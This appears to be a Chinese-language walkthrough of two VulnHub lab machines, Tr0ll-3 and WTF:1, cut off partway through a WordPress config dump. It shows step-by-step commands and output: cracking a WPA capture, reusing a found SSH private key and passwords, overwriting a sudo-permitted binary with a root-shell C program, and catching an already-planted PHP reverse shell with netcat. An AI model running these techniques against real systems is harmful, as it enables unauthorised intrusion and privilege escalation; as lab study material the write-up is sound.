娱乐级别：超过9000


#### 信息收集

上nmap

``` bash
root@kali:~# nmap -sn -v 192.168.56.*
Nmap scan report for 192.168.56.120
Host is up (0.00018s latency).
MAC Address: 08:00:27:C3:39:77 (Oracle VirtualBox virtual NIC)
```

``` bash
root@kali:~# nmap -v -sV -p- 192.168.56.120
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
```

使用默认的账号密码登录ssh

``` bash
root@kali:~# ssh start@192.168.56.120
Enter passphrase for key '/root/.ssh/id_rsa': 
start@192.168.56.120's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

start@Tr0ll3:~$ id
uid=1001(start) gid=1001(start) groups=1001(start)
start@Tr0ll3:~$ whoami
start
start@Tr0ll3:~$ ls
bluepill  redpill
start@Tr0ll3:~$
```

如下所示使用find命令枚举具有“0777”所有权限的可写文件。

``` bash
start@Tr0ll3:~$ find / -type f -perm 0777 2>/dev/null
/var/log/.dist-manage/wytshadow.cap
/.hints/lol/rofl/roflmao/this/isnt/gonna/stop/anytime/soon/still/going/lol/annoyed/almost/there/jk/no/seriously/last/one/rofl/ok/ill/stop/however/this/is/fun/ok/here/rofl/sorry/you/made/it/gold_star.txt
```

发现两个有趣的文件，一个是“.cap文件”（wytshadow.cap），另一个是“文本文件”（gold_star.txt）。

并将它们下载下来，然后分析它们

有了.cap文件，可以用Wireshark打开该文件，发现所有数据包都将协议标记为“ 802.11”，并且捕获的流量看起来像无线网络数据包，因为众所周知，802.11是用于传输的协议无线连接的设备之间的数据包的数量。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub236.jpg)

嗯！在这里aircrack-ng可能有助于提取密码。在这里可以将gold_star.txt文件与wytshadow.cap一起使用，如下图所示。

``` bash
root@kali:~/vulnhub/troll3# aircrack-ng -w gold_star.txt wytshadow.cap
Reading packets, please wait...
Opening wytshadow.cap
Read 1183 packets.

   #  BSSID              ESSID                     Encryption

   1  18:D6:C7:3F:23:89  wytshadow                 WPA (1 handshake)

Choosing first network as target.

Reading packets, please wait...
Opening wytshadow.cap
Read 1183 packets.

1 potential targets


                               Aircrack-ng 1.6 

      [00:04:34] 2451168/3248872 keys tested (9090.46 k/s) 

      Time left: 1 minute, 27 seconds                           75.45%

                          KEY FOUND! [ gaUoCe34t1 ]


      Master Key     : ED 12 0B 40 F5 AF 80 16 F5 F7 4F 9F 9E 39 BB AE 
                       00 32 07 E9 26 81 31 DB 9C 54 64 84 5E 5D 19 C6 

      Transient Key  : 7F 1C A9 01 4E B9 B3 6F B3 95 7D D2 6E C9 10 BE 
                       50 D4 1A 6C 72 F8 AB 8B 97 A4 20 B1 2D 92 19 18 
                       C7 86 C0 17 2D 05 28 C7 6F 95 06 12 4F C2 F5 2A 
                       87 B7 F5 21 22 3D F7 CA BC 99 8B B5 CA 15 EA 43 

      EAPOL HMAC     : 73 4D E4 22 8E B7 F2 91 4E 74 7D CF 59 73 80 F7
```

太屌了！！aircrack-ng给了密码:gaUoCe34t1。

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub237.jpg)

获取密码后，将使用凭据wytshadow：gaUoCe34t1切换到另一个名为“wytshadow的帐户”的帐户

``` bash
start@Tr0ll3:~$ su wytshadow
Password: 
wytshadow@Tr0ll3:/home/start$ id
uid=1003(wytshadow) gid=1003(wytshadow) groups=1003(wytshadow)
wytshadow@Tr0ll3:/home/start$ whoami
wytshadow
wytshadow@Tr0ll3:/home/start$ pwd
/home/start
wytshadow@Tr0ll3:/home/start$ ls
ls: cannot open directory '.': Permission denied
```

成功登录后，查看了“/”目录的目录和文件列表，并注意到一个名为“ohhfun”的文件具有SUID位，因此它具有以root身份运行的权限。

考虑到这一点，按照给定的图形运行了文件。在这里可以看到它通过连续执行文本消息指向LYNX。

``` bash
wytshadow@Tr0ll3:~$ pwd
/home/wytshadow
wytshadow@Tr0ll3:~$ ./oohfun
iM Cr@zY L1k3 AAA LYNX
iM Cr@zY L1k3 AAA LYNX
iM Cr@zY L1k3 AAA LYNX
```

Lynx是一个命令行浏览器，也许它将不得不做进一步的工作。

然后，使用Wytshadow的sudo权限，发现nginx可作为root运行。

``` bash
wytshadow@Tr0ll3:~$ sudo -l
[sudo] password for wytshadow: 
Matching Defaults entries for wytshadow on Tr0ll3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wytshadow may run the following commands on Tr0ll3:
    (root) /usr/sbin/service nginx start
```

遍历nginx目录并打开其配置文件“sites-enabled sites”文件。看到用户代理为Lynx，正在侦听8080。

如下所示

``` bash
wytshadow@Tr0ll3:/etc/nginx/sites-enabled$ cat default 
##
# You should look at the following URL's in order to grasp a solid understanding
# of Nginx configuration files in order to fully unleash the power of Nginx.
# https://www.nginx.com/resources/wiki/start/
# https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/
# https://wiki.debian.org/Nginx/DirectoryStructure
#
# In most cases, administrators will remove this file from sites-enabled/ and
# leave it as reference inside of sites-available where it will continue to be
# updated by the nginx packaging team.
#
# This file will automatically load configuration files provided by other
# applications, such as Drupal or Wordpress. These applications will be made
# available underneath a path with that package name, such as /drupal8.
#
# Please see /usr/share/doc/nginx-doc/examples/ for more detailed examples.
##

# Default server configuration
#
server {
        listen 8080 default_server;
        listen [::]:8080 default_server;
                if ($http_user_agent !~ "Lynx*"){
    return 403;
}
        # SSL configuration
        #
        # listen 443 ssl default_server;
        # listen [::]:443 ssl default_server;
        #
        # Note: You should disable gzip for SSL traffic.
        # See: https://bugs.debian.org/773332
        #
        # Read up on ssl_ciphers to ensure a secure configuration.
        # See: https://bugs.debian.org/765782
        #
        # Self signed certs generated by the ssl-cert package
        # Don't use them in a production server!
        #
        # include snippets/snakeoil.conf;

        root /var/nginx/www;

        # Add index.php to the list if you are using PHP
        index index.html index.htm index.nginx-debian.html;

        server_name _;

        location / {
                # First attempt to serve request as file, then
                # as directory, then fall back to displaying a 404.
                try_files $uri $uri/ =404;
        }

        # pass PHP scripts to FastCGI server
        #
        #location ~ \.php$ {
        #       include snippets/fastcgi-php.conf;
        #
        #       # With php-fpm (or other unix sockets):
        #       fastcgi_pass unix:/var/run/php/php7.0-fpm.sock;
        #       # With php-cgi (or other tcp sockets):
        #       fastcgi_pass 127.0.0.1:9000;
        #}

        # deny access to .htaccess files, if Apache's document root
        # concurs with nginx's one
        #
        #location ~ /\.ht {
        #       deny all;
        #}
}


# Virtual Host configuration for example.com
#
# You can move that to a different file under sites-available/ and symlink that
# to sites-enabled/ to enable it.
#
#server {
#       listen 80;
#       listen [::]:80;
#
#       server_name example.com;
#
#       root /var/www/example.com;
#       index index.html;
#
#       location / {
#               try_files $uri $uri/ =404;
#       }
#}
```

此外，如上所示，启动了nginx服务。使用netstat命令，看到端口8080已打开。再次尝试进行nmap扫描，如下所示。


``` bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    nginx 1.14.0 (Ubuntu)
```

``` bash
wytshadow@Tr0ll3:/etc/nginx/sites-enabled$ sudo /usr/sbin/service nginx start
wytshadow@Tr0ll3:/etc/nginx/sites-enabled$ netstat -antp
(No info could be read for "-p": geteuid()=1003 but you should be root.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 192.168.56.120:22       192.168.56.1:20737      ESTABLISHED -                   
tcp        0    448 192.168.56.120:22       192.168.56.102:48480    ESTABLISHED -                   
tcp6       0      0 :::8080                 :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      - 
```

如前所述，在本地计算机上安装一个lynx浏览器。打开与刚打开的端口关联的页面。

``` bash
root@kali:~/vulnhub/troll3# apt-get install lynx
...
root@kali:~/vulnhub/troll3# lynx http://192.168.56.120:8080/
genphlux:HF9nd0cR!
```

通过lynx打开页面上给定的链接时，会找到这些登录凭据。不是那么困难。

找到的凭证：

``` bash
Username: genphlux
Password: HF9nd0cr!
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub238.jpg)

随着有了更多的凭据，使用上述枚举凭据切换到genphlux的用户。

``` bash
wytshadow@Tr0ll3:/home$ su genphlux
Password: 
genphlux@Tr0ll3:/home$ id
uid=1004(genphlux) gid=1004(genphlux) groups=1004(genphlux)
genphlux@Tr0ll3:/home$ whoami
genphlux
genphlux@Tr0ll3:/home$ pwd
/home
genphlux@Tr0ll3:/home$
```

登录后，找到了一个名为maleus的文件，如下所示，并且通过浏览该文件，看到了它存储RSA密钥。

``` bash
genphlux@Tr0ll3:/home$ cd
genphlux@Tr0ll3:~$ ls -la
total 44
drwx------  4 genphlux genphlux 4096 Aug  2  2019 .
drwxr-xr-x 10 root     root     4096 Jun 19  2015 ..
-rw-r--r--  1 genphlux genphlux  220 Jun 17  2015 .bash_logout
-rw-r--r--  1 genphlux genphlux 3637 Jun 17  2015 .bashrc
drwx------  2 genphlux genphlux 4096 Jun 17  2015 .cache
drwx------  3 genphlux genphlux 4096 Aug  1  2019 .gnupg
-rw-rw-r--  1 genphlux genphlux 1675 Jun 18  2015 maleus
-rw-r--r--  1 genphlux genphlux  675 Jun 17  2015 .profile
-rw-------  1 genphlux genphlux 5649 Jun 17  2015 .viminfo
-rw-rw-r--  1 genphlux genphlux  931 Aug  2  2019 xlogin
genphlux@Tr0ll3:~$ file maleus 
maleus: PEM RSA private key
genphlux@Tr0ll3:~$ cat maleus 
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAwz5Hwer48U1t/Qi9JveuO+Z7WQlnmhOOs/2pZ0he/OyVsEFv
DsGib1wu/N8t+7h9JZK9x2GL33TXQBVCy6TxES90F1An+2DSza6lJPCyhcgK/DEp
yxSVt32A+lFo+PQJV6QYZlpRkek0MjUw5y/E5qZwdBypC55C4QzgQBN3+Lnuhuk4
u52xcK9/6/2N7JZCNYA21Tp1Uy9mty/65IT7OwKJd2rXp3O6rZYTD/vPl+Rt/LtN
gA1DbDODq0NCmvcrZL+SafSj+MABA3LCERw01gA4RMdyxJU6hVfjeSKOdwDQOGWe
eAVCL2GR/frwyf+rfN1kbpdw/RGXWWwVANMcaQIDAQABAoIBAGNudFztrZo2NK2I
pcwSl0kqN+dAQuLU0vgXVw6ibL2iPxlkOYrqUi8kY0mk32YyrolUEhJYO0Ox3W1l
Zn8PoTV/VUAKMlJzHOhi6PfHHSPEnNOSthYWhajM4cKZczxWC+v2RfbaSHBms45e
SGl0inJskRiRAAZKswSp6gq334FrS6Dwy1tiKvzCfR3kLQghV5U/PhFZCsq3xvAw
eXPx2toNtU2gYSGrKWTep+nAKM1neBxeZAujYuN4xJ5/Th2y0pyTvX9WEgzKPJ/G
PlYZYCUAKPCbabYSuZckjeiN1aS52AIFedECBfAIezOr08Wx/bI/xCOgBxrQgPrK
kRvlOYECgYEA5eCIEfdLhWdg3ltadYE0O5VAoXKrbxYWqSyw1Eyeqj0N1qD9Rsvg
jIQJazV5JcVBIF54f/jlCJozR5s5AELrY0Z/krea1lF5ecOSUQE3tp94298xzO3g
7BBe3g6pD56Cya/Vo0+YVQmAnBHLh6QIYvUUXXN2IyceT8fhEx5JA+sCgYEA2W4z
KKMVAdPxKcjVks1zdGmVlj1RsUkakYuLWV3jQe2w1naJrc37Khy5eWZaRJhXqeBb
1cvTMa+r/BF7jvItxglWoBJqXDxKI0a6KqWtloZL2ynoaBkAhR2btob6nSN63Bpg
ZYJKY1B5yYbDHK4k6QT7atn2g6DAv/7sW6skj/sCgYA16WTAIek6TjZvr6kVacng
N27C7mu6T8ncvzhxcc68SjlWnscHtYTiL40t8YqKCyrs9nr4OF0umUtxfbvujcM6
syv0Ms9DeDQvFGjaSpjQYbIsjrnVP+zCMEyvc2y+1wQBXRWTiXVGbEYXVC0RkKzO
2H+AMzX/pIr9Vvk4TJ//JQKBgFNJcy9NyO46UVbAJ49kQ6WEDFjQhEp0xkiaO3aw
EC1g7yw3m+WH0X4AIsvt+QXtlSbtWkA7I1sU/7w+tiW7fu0tBpGqfDN4pK1+mjFb
5XKTXttE4lF9wkU7Yjo42ib3QEivkd1QW05PtVcM2BBUZK8dyXDUrSkemrbw33j9
xbOhAoGBAL8uHuAs68ki/BWcmWUUer7Y+77YI/FFm3EvP270K5yn0WUjDJXwHpuz
Fg3n294GdjBtQmvyf2Wxin4rxl+1aWuj7/kS1/Fa35n8qCN+lkBzfNVA7f626KRA
wS3CudSkma8StmvgGKIU5YcO8f13/3QB6PPBgNoKnF5BlFFQJqhK
-----END RSA PRIVATE KEY-----
```

因此，将RSA密钥复制到一个名为“key”的文本文件中，并分配了权限600，该权限只能由特定用户访问。

``` bash
root@kali:~/vulnhub/troll3# chmod 600 key
root@kali:~/vulnhub/troll3# ssh maleus@192.168.56.120 -i key
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-55-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

maleus@Tr0ll3:~$ id
uid=1000(maleus) gid=1000(maleus) groups=1000(maleus),1005(backups)
maleus@Tr0ll3:~$ whoami
maleus
maleus@Tr0ll3:~$ pwd
/home/maleus
```

成功登录后，找到了一个名为“don't_even_bother”的文件，该文件具有完全权限，并且借助文件的类型，确定其类型为ELF 64位，此外，在其中找到了另一个文件“.viminfo”文件。同一目录。

``` bash
maleus@Tr0ll3:~$ ls -la
total 48
drwx------  5 maleus maleus 4096 Aug  2  2019 .
drwxr-xr-x 10 root   root   4096 Jun 19  2015 ..
-rw-r--r--  1 maleus maleus  220 Jun 17  2015 .bash_logout
-rw-r--r--  1 maleus maleus 3637 Jun 17  2015 .bashrc
drwx------  2 maleus maleus 4096 Jun 17  2015 .cache
-rwxrwxr-x  1 maleus maleus 8674 Jun 18  2015 dont_even_bother
drwx------  3 maleus maleus 4096 Aug  1  2019 .gnupg
-rw-r--r--  1 maleus maleus  675 Jun 17  2015 .profile
drwx------  2 maleus maleus 4096 Jun 18  2015 .ssh
-rw-------  1 maleus maleus 1301 Aug  2  2019 .viminfo
```

此外，使用cat命令来检查viminfo文件。经过仔细检查，发现了maleus用户的密码“B^slc8I$”。这是一个很好的发现。

``` bash
maleus@Tr0ll3:~$ cat .viminfo
# This viminfo file was generated by Vim 7.4.
# You may edit it if you're careful!

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Command Line History (newest to oldest):
:wq
:q
:q!
:!shell

# Search String History (newest to oldest):

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Input Line History (newest to oldest):

# Registers:
""1     LINE    0
        passwd
"2      LINE    0
        B^slc8I$
"3      LINE    0
        passswd  

# File marks:

# Jumplist (newest first):

# History of marks within files (newest to oldest):

        +       25      62

> ~/Desktop/troll3/maleus
        *       1564779412      0
        "       27      28
        ^       27      29
        .       27      28
        +       27      28
> ~/Desktop/troll3/maleus
        *       1564779412      0
        "       27      28
        ^       27      29
        .       27      28
        +       27      28
> ~/Desktop/troll3/maleus
        *       1564779412      0
        "       27      28
        ^       27      29
        .       27      28
        +       27      28
> ~/Desktop/troll3/maleus
        *       1564779412      0
        "       27      28
        ^       27      29
        .       27      28
        +       27      28
> ~/Desktop/troll3/maleus
        *       1564779412      0
        "       27      28
        ^       27      29
        .       27      28
        +       27      28
> ~/Desktop/troll3/maleus
        *       1564779412      0
        "       27      28
        ^       27      29
        .       27      28
        +       27      28
> ~/Desktop/troll3/maleus
        *       1564779412      0
        "       27      28
        ^       27      29
        .       27      28
        +       27      28
> ~/Desktop/troll3/maleus
        *       1564779412      0
        "       27      28
        ^       27      29
        .       27      28
        +       27      28
> ~/Desktop/troll3/maleus
        *       1564779412      0
        "       27      28
        ^       27      29
        .       27      28
        +       27      28
```

#### 提权

现在有了maleus的密码，确定maleus的sudo权限。

``` bash
maleus@Tr0ll3:~$ sudo -l
[sudo] password for maleus: 
Matching Defaults entries for maleus on Tr0ll3:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User maleus may run the following commands on Tr0ll3:
    (root) /home/maleus/dont_even_bother
```

运行命令后，发现maleus可以以root用户身份运行don't_even_bother文件。因此，为了提升此计算机上的权限，将使用此文件来注入恶意代码。首先，使用echo清空此文件的内容，然后使用nano命令对其进行编辑。

``` bash
maleus@Tr0ll3:~$ echo "" > dont_even_bother
maleus@Tr0ll3:~$ cat dont_even_bother 

maleus@Tr0ll3:~$ nano dont_even_bother.c
```

现在，在打开该文件之后，编写了一个小的.C脚本，它将在编译后执行时调用shell。

``` bash
int main (void){
       setresuid(0, 0, 0);
       system("/bin/sh");
}
```

现在，因为是“.c”文件，所以将不得不使用gcc编译器对其进行编译，然后按照sudo权限执行该文件dont_even_bother。

即可获取系统root权限并且找到了flag文件，如下所示：

``` bash
maleus@Tr0ll3:~$ ls
dont_even_bother  dont_even_bother.c
maleus@Tr0ll3:~$ gcc dont_even_bother.c -o dont_even_bother
dont_even_bother.c: In function ‘main’:
dont_even_bother.c:2:8: warning: implicit declaration of function ‘setresuid’ [-Wimplicit-function-declaration]
        setresuid(0, 0, 0);
        ^~~~~~~~~
dont_even_bother.c:3:8: warning: implicit declaration of function ‘system’ [-Wimplicit-function-declaration]
        system("/bin/sh");
        ^~~~~~
maleus@Tr0ll3:~$ sudo /home/maleus/dont_even_bother
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# pwed
/bin/sh: 3: pwed: not found
# pwd
/home/maleus
# cd /root
# ls
flag.txt
# cat flag.txt  
You are truly a Jedi!

Twitter Proof:

Pr00fThatTh3L33tHax0rG0tTheFl@g!!

@Maleus21
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub239.jpg)

#### 知识点总结

 - aircrack-ng破解.cap包密码
 - nginx用户代理
 - lynx浏览器使用
 - 使用ssh RSA密钥登录ssh
 - .viminfo文件泄露密码
 - setresuid(0, 0, 0) c语言脚本提权

<font color="red">Game over</font>

不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this...It's a pity...

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="green">***The end,to be continue...***</font>



















<!-- kb:end Tr0ll-3 -->

</details>

<a id="case-wtf-1"></a>

## 既有回连配置与 sudo pip

站点中的 shell 文件含固定回连目标，网络配置与 Wireshark 证据解释初次失败。后续账户和 sudo pip 的原有路线完整留存。

<p class="kb-provenance">来源 WTF-1 · 原记录 2019-12-24 · 12 个代码块 · 9 处图片引用</p>

<details class="kb-evidence" id="record-wtf-1">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start WTF-1 -->

名称：WTF: 1
发布日期：2019年11月22日

下载：

 - Download: https://mega.nz/#!dmZGDQRa!eiUQN_w_qZODlonwe8RM5WsOHFrpi3wqIyFfVc2DyU0
 - Download (Mirror): https://download.vulnhub.com/wtf/wtf.rar
 - Download (Torrent): https://download.vulnhub.com/wtf/wtf.rar.torrent

描述：
初学者-中级机器，您的目标是获取/root/flag.txt。
记住,很好的列举！基于VMware,您可能会遇到VB问题。



#### 网络配置

一开始安装虚拟机打开的时候会遇到描述中所说的获取不到ip的现象参考文章[Vulnhub靶机检测不到IP地址](https://blog.csdn.net/qq_41918771/article/details/103636890)，这篇文章写的很详细，不用我多说，自己看着一步步配置就行。

#### 信息收集

上nmap

``` bash
root@kali:~# nmap -sn -v 192.168.142.0/24
Nmap scan report for 192.168.142.134
Host is up (0.00017s latency).
MAC Address: 00:0C:29:CA:25:F7 (VMware)
```

``` bash
root@kali:~# nmap -sS -sV -T5 -A -p- -v --script=vuln 192.168.142.134
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Apache/2.4.38 (Debian)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:apache:http_server:2.4.38: 
|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211
|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082
|       CVE-2019-10097  6.0     https://vulners.com/cve/CVE-2019-10097
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
|       CVE-2019-0215   6.0     https://vulners.com/cve/CVE-2019-0215
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
|       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196
|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197
|_      CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
```

开了22和80两个端口

下载github上评分22.1k的seclists字典

``` bash
root@kali:~# apt -y install seclists
正在读取软件包列表... 完成
正在分析软件包的依赖关系树       
正在读取状态信息... 完成       
下列软件包是自动安装的并且现在不需要了：
  apt-file command-not-found libapt-pkg-perl libexporter-tiny-perl libisl21 libjim0.77
  liblist-moreutils-perl libregexp-assemble-perl
使用'apt autoremove'来卸载它(它们)。
下列【新】软件包将被安装：
  seclists
升级了 0 个软件包，新安装了 1 个软件包，要卸载 0 个软件包，有 0 个软件包未被升级。
需要下载 276 MB 的归档。
解压缩后会消耗 1,033 MB 的额外空间。
获取:1 https://mirrors.ustc.edu.cn/kali kali-rolling/main amd64 seclists all 2019.4-0kali2 [276 MB]
已下载 276 MB，耗时 45秒 (6,170 kB/s)                                                                 
正在选中未选择的软件包 seclists。
(正在读取数据库 ... 系统当前共安装有 318480 个文件和目录。)
准备解压 .../seclists_2019.4-0kali2_all.deb  ...
正在解压 seclists (2019.4-0kali2) ...
正在设置 seclists (2019.4-0kali2) ...
```
gobuster扫一波发现zhkh目录

``` bash
root@kali:~# gobuster dir --url http://192.168.142.134/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.142.134/
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2019/12/24 00:34:22 Starting gobuster
===============================================================
/javascript (Status: 301)
/server-status (Status: 403)
[ERROR] 2019/12/24 00:34:24 [!] parse http://192.168.142.134/error_log: net/url: invalid control character in URL
/zhkh (Status: 301)
===============================================================
2019/12/24 00:34:27 Finished
===============================================================
```

访问http://192.168.142.134/zhkh/发现是wordpress5.3版本程序搭建的

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub87.jpg)

burp添加规则如下图所示即可访问完整的正常页面

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub89.jpg)

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub88.jpg)

爆破后台密码和寻找wordpress漏洞无果之后下一步操作

由于提示good enumeration,进入wp-content/uploads/目录下有新发现shell.php

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub90.jpg)

访问shell.php出现错误提示

``` bash
WARNING: Failed to daemonise. This is quite common and not fatal. Connection refused (111) 
```

看错误得知是php-reverse-shell，就是反弹shell的php木马

用wireshark抓包查看php-reverse-shell请求的ip和端口以便于nc后续本地监听需要

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub91.jpg)

得知请求ip为192.168.1.14，端口为5555

#### getshell

NAT模式的网络配置改成192.168.1.0/24，之后给kali配置一个静态IP 192.168.1.14，然后重启kali和wtf靶机，访问php-reverse-shell

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub92.jpg)

成功弹回shell

``` bash
root@kali:~# nc -lvp 5555
listening on [any] 5555 ...
192.168.1.15: inverse host lookup failed: Unknown host
connect to [192.168.1.14] from (UNKNOWN) [192.168.1.15] 47192
Linux wtf 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64 GNU/Linux
 01:56:54 up 1 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ whoami
www-data
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@wtf:/$ ls
ls
bin   home            lib32       media  root  sys  vmlinuz
boot  initrd.img      lib64       mnt    run   tmp  vmlinuz.old
dev   initrd.img.old  libx32      opt    sbin  usr
etc   lib             lost+found  proc   srv   var
```

#### 提权

查看SUID权限可执行文件，没有可用的

``` bash
www-data@wtf:/$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/mount
/usr/bin/su
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
```

sudo -l又需要输入密码

进入/var/www/html/zhkh目录查看wp-config.php文件

``` bash
www-data@wtf:/var/www/html/zhkh$ cat wp-config.php
cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wp_database' );

/** MySQL database username */
define( 'DB_USER', 'ra' );

/** MySQL database password */
define( 'DB_PASSWORD', '912391929129' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'hmdNSrpLV5we) E$0_/E,$Vxr0%<S{]D@)T+rc%a7wvbr)Q|bm7boJdOz/AN>/#&' );
define( 'SECURE_AUTH_KEY',  'DR&l3>0z8mmFT+Y}#bqND_~H;wb[r|:te+tN%:K PS7=~~/;uA5)zj~Z%tu}-8UJ' );
define( 'LOGGED_IN_KEY',    '7+cns%lA?p60U~*(J,z9zp4w 2%hB1S6jZ0NuUgl(oK,#H6&GL,i@+4m:1w3|-aW' );
define( 'NONCE_KEY',        'm5,d=I4 MShd4lU#8F@@oj2cKpc+J[Kp3bRt%Sfuw.%#`oVKzgDMTl5+D[nu,R<K' );
define( 'AUTH_SALT',        'sl3w_.}n|M{~D#6,v]U?Kz/,k&oCnn1._|(i3Y|ng7+<-f4Nv7mmR4B<i>!?du#i' );
define( 'SECURE_AUTH_SALT', 'b>,[La8I5xqchTMvXN-bI8%[)-V[wHjNmj/1jZ_Vnq`q0<|E@6^.8~KpI_#53Rw_' );
define( 'LOGGED_IN_SALT',   'v_`E=EA]$UBa.2P|%YV4cl}(c@AVkW$V5959/gQL~a:,O}qfG85Xc4)=xRBux6g?' );
define( 'NONCE_SALT',       'TE#Tim,4h|zKYm$he[F%J*4vG{v]VK!jP0sSeBLHp7Mp|P*XJz:=&n<nsfbIFq>a' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the Codex.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
